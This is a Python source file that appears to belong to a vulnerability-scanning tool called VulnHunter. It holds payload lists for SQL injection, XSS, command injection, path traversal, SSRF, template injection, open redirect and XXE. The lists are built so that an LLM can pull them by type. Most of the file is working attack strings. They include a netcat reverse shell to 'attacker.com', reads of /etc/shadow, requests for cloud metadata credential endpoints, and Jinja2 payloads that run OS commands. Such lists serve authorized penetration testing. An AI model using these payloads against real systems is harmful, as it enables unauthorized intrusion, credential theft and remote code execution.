"""
Payload Collections for VulnHunter
Comprehensive payload lists for vulnerability testing
"""

from typing import List, Dict


class PayloadCollections:
    """
    Pre-built payload collections for various vulnerability types
    Easy for LLM to access and use
    """
    
    # SQL Injection Payloads
    SQLI_ERROR_BASED = [
        "'",
        "\"",
        "'--",
        "\"--",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 1=1#",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "') OR ('1'='1",
        "') OR '1'='1'--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "1' ORDER BY 100--",
        "1 UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
    ]
    
    SQLI_UNION_BASED = [
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT 1,2,3--",
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
        "' UNION SELECT database()--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns--",
        "-1 UNION SELECT 1,2,3--",
        "1' UNION SELECT 1,2,3 FROM dual--",
    ]
    
    SQLI_TIME_BASED = [
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; SELECT PG_SLEEP(5)--",
        "' AND (SELECT SLEEP(5))--",
        "' AND BENCHMARK(10000000,SHA1('test'))--",
        "'; SELECT DBMS_LOCK.SLEEP(5) FROM dual--",
    ]
    
    SQLI_BOOLEAN_BASED = [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 1=1#",
        "' AND 1=2#",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' OR 1=1--",
        "' OR 1=2--",
        "' AND (SELECT COUNT(*) FROM users) > 0--",
        "' AND SUBSTRING(username,1,1)='a'--",
    ]
    
    # XSS Payloads
    XSS_BASIC = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ]
    
    XSS_ATTRIBUTE_ESCAPE = [
        "\" onclick=alert(1) \"",
        "' onclick=alert(1) '",
        "\" onmouseover=alert(1) \"",
        "' onmouseover=alert(1) '",
        "\" onfocus=alert(1) autofocus \"",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\" style=animation-name:x onanimationend=alert(1) \"",
        "' style='background:url(javascript:alert(1))'",
    ]
    
    XSS_JAVASCRIPT_CONTEXT = [
        "'-alert(1)-'",
        "\\'-alert(1)//",
        "</script><script>alert(1)</script>",
        "*/alert(1)/*",
        "';alert(1)//",
        "\";alert(1)//",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    ]
    
    XSS_FILTER_BYPASS = [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<svg/onload=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<svg onload=alert&#40;1&#41;>",
        "<img src=x onerror=\\u0061lert(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<svg/onload=alert`1`>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    ]
    
    XSS_POLYGLOTS = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"--></style></script><svg/onload=alert()>",
        "'-var x=1-alert(1)-1//\\'-alert(1)//\"</script><script>alert(1)</script>",
    ]
    
    # Command Injection
    CMD_LINUX = [
        "; id",
        "| id",
        "& id",
        "|| id",
        "&& id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; uname -a",
        "; ls -la",
        "| ls -la",
        "; sleep 5",
        "| sleep 5",
        "$(sleep 5)",
        "`sleep 5`",
        "; ping -c 5 127.0.0.1",
        "\n id",
        "\r\n id",
        "; nc -e /bin/sh attacker.com 4444",
    ]
    
    CMD_WINDOWS = [
        "& whoami",
        "| whoami",
        "& dir",
        "| dir",
        "& type C:\\Windows\\win.ini",
        "& ping -n 5 127.0.0.1",
        "| ping -n 5 127.0.0.1",
        "& net user",
        "& ipconfig",
        "| ipconfig",
        "& systeminfo",
    ]
    
    # Path Traversal
    PATH_TRAVERSAL_LINUX = [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
    ]
    
    PATH_TRAVERSAL_WINDOWS = [
        "..\\Windows\\win.ini",
        "..\\..\\Windows\\win.ini",
        "..\\..\\..\\Windows\\win.ini",
        "..%5c..%5c..%5cWindows\\win.ini",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
    ]
    
    # SSRF
    SSRF_LOCALHOST = [
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://localhost:8080",
        "http://0.0.0.0",
        "http://0",
        "http://127.1",
        "http://[::1]",
        "http://[0:0:0:0:0:0:0:1]",
    ]
    
    SSRF_CLOUD_METADATA = [
        # AWS
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/",
        
        # GCP
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token",
        
        # DigitalOcean
        "http://169.254.169.254/metadata/v1/",
        
        # Alibaba
        "http://100.100.100.200/latest/meta-data/",
    ]
    
    SSRF_BYPASS = [
        # IP encoding
        "http://2130706433",  # 127.0.0.1 decimal
        "http://0x7f000001",  # 127.0.0.1 hex
        "http://0177.0.0.1",  # 127.0.0.1 octal
        "http://0x7f.0x0.0x0.0x1",
        
        # IPv6
        "http://[::ffff:127.0.0.1]",
        "http://[::ffff:7f00:1]",
        
        # URL tricks
        "http://127.0.0.1%23@example.com",
        "http://example.com@127.0.0.1",
        "http://127.0.0.1%00.example.com",
        
        # Protocol variations
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/info",
        "gopher://127.0.0.1:6379/_INFO",
    ]
    
    # SSTI (Server-Side Template Injection)
    SSTI_DETECTION = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "#{7*7}",
        "*{7*7}",
        "@(7*7)",
        "{{config}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ]
    
    SSTI_JINJA2 = [
        "{{config}}",
        "{{config.items()}}",
        "{{self.__class__}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
    ]
    
    # Open Redirect
    OPEN_REDIRECT = [
        "//evil.com",
        "///evil.com",
        "\\\\evil.com",
        "/\\evil.com",
        "https://evil.com",
        "//evil.com/",
        "https:evil.com",
        "http://evil.com%2f%2f",
        "//evil%E3%80%82com",
        "/evil.com",
        "/.evil.com",
        "////evil.com",
        "https://example.com@evil.com",
        "https://evil.com#.example.com",
        "https://evil.com?.example.com",
    ]
    
    # XXE (XML External Entity)
    XXE_BASIC = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]><foo></foo>',
    ]
    
    @classmethod
    def get_all_sqli(cls) -> List[str]:
        """Get all SQL injection payloads"""
        payloads = []
        payloads.extend(cls.SQLI_ERROR_BASED)
        payloads.extend(cls.SQLI_UNION_BASED)
        payloads.extend(cls.SQLI_TIME_BASED)
        payloads.extend(cls.SQLI_BOOLEAN_BASED)
        return payloads
    
    @classmethod
    def get_all_xss(cls) -> List[str]:
        """Get all XSS payloads"""
        payloads = []
        payloads.extend(cls.XSS_BASIC)
        payloads.extend(cls.XSS_ATTRIBUTE_ESCAPE)
        payloads.extend(cls.XSS_JAVASCRIPT_CONTEXT)
        payloads.extend(cls.XSS_FILTER_BYPASS)
        payloads.extend(cls.XSS_POLYGLOTS)
        return payloads
    
    @classmethod
    def get_all_ssrf(cls) -> List[str]:
        """Get all SSRF payloads"""
        payloads = []
        payloads.extend(cls.SSRF_LOCALHOST)
        payloads.extend(cls.SSRF_CLOUD_METADATA)
        payloads.extend(cls.SSRF_BYPASS)
        return payloads
    
    @classmethod
    def get_payloads_by_type(cls, vuln_type: str) -> List[str]:
        """
        Get payloads for a specific vulnerability type
        
        LLM Usage:
            payloads = PayloadCollections.get_payloads_by_type("sqli")
        """
        type_map = {
            'sqli': cls.get_all_sqli,
            'xss': cls.get_all_xss,
            'ssrf': cls.get_all_ssrf,
            'cmd-linux': lambda: cls.CMD_LINUX,
            'cmd-windows': lambda: cls.CMD_WINDOWS,
            'lfi': lambda: cls.PATH_TRAVERSAL_LINUX,
            'lfi-windows': lambda: cls.PATH_TRAVERSAL_WINDOWS,
            'ssti': lambda: cls.SSTI_DETECTION + cls.SSTI_JINJA2,
            'redirect': lambda: cls.OPEN_REDIRECT,
            'xxe': lambda: cls.XXE_BASIC,
        }
        
        if vuln_type in type_map:
            getter = type_map[vuln_type]
            return getter() if callable(getter) else getter
        
        return []
